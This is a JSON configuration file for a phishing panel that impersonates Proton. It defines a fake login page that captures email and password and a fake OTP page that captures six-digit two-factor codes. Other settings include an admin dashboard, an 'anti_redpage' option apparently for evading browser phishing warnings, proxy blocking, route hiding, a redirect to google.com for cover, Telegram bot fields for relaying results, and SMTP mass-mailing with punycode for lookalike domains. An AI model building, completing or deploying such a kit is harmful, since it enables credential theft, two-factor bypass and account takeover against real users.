{
  "service": "Proton",
  "flask": {
    "host": "0.0.0.0",
    "port": 3000,
    "debug": true
  },
  "mysql": {
    "host": "localhost",
    "user": "root",
    "password": "",
    "database": "panel",
    "port": 3306
  },
  "admin": {
    "login_route": "/adminlogin",
    "dashboard_route": "/admin",
    "password": "admin_pass"
  },
  "redirect": "google.com",
  "waiting": "/waiting",
  "background_color": "#0a0b0d",
  "no_route": true,
  "param_conf": {},
  "options": {
    "panel_status": true,
    "anti_redpage": true,
    "block_proxy": false,
    "mobile_only": false,
    "hide_route": true,
    "showNotifications": true,
    "deleteInactiveSessions": "true",
    "redirectURL": "google.com",
    "workflow_mode": false,
    "workflow_pages": [],
    "telegram": {
      "telegram_bot": null,
      "telegram_bot_username": "",
      "telegram_notification": null,
      "telegram_chat_id": "",
      "telegram_bot_token": "",
      "admin_ids": []
    },
    "soundEffects": true,
    "admin_whitelist": [
      "127.0.0.1"
    ]
  },
  "email": {
    "smtp_servers": [],
    "email_details": {
      "batch_size": 20,
      "punycode": true
    }
  },
  "data_links": [],
  "pages": {
    "proton_login": {
        "template": "/proton/login.html",
        "route": "/proton_login",
        "panel": {
            "input": {
                "name": "Proton Login",
                "values": [
                    {
                        "value": "password",
                        "placeholder": "\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022",
                        "type": "text"
                    }
                ],
                "required_data": [
                    {
                        "value": "email",
                        "placeholder": "Email",
                        "type": "text"
                    }
                ]
            }
        },
        "form": {
            "password": "password"
        },
        "preview_image": "previews/proton/login.png"
    },
    "proton_otp": {
        "template": "/proton/otp.html",
        "formName": "totpForm",
        "route": "/proton_otp",
        "type": "otp",
        "panel": {
            "input": {
                "name": "Proton OTP",
                "values": [
                    {
                        "value": "code1",
                        "placeholder": "1",
                        "type": "tel"
                    },
                    {
                        "value": "code2",
                        "placeholder": "2",
                        "type": "tel"
                    },
                    {
                        "value": "code3",
                        "placeholder": "3",
                        "type": "tel"
                    },
                    {
                        "value": "code4",
                        "placeholder": "4",
                        "type": "tel"
                    },
                    {
                        "value": "code5",
                        "placeholder": "5",
                        "type": "tel"
                    },
                    {
                        "value": "code6",
                        "placeholder": "6",
                        "type": "tel"
                    }
                ],
                "required_data": []
            }
        },
        "form": {
            "code1": "code1",
            "code2": "code2",
            "code3": "code3",
            "code4": "code4",
            "code5": "code5",
            "code6": "code6"
        },
        "preview_image": "previews/proton/otp.png"
    }
  },
  "version": "0.0"
}
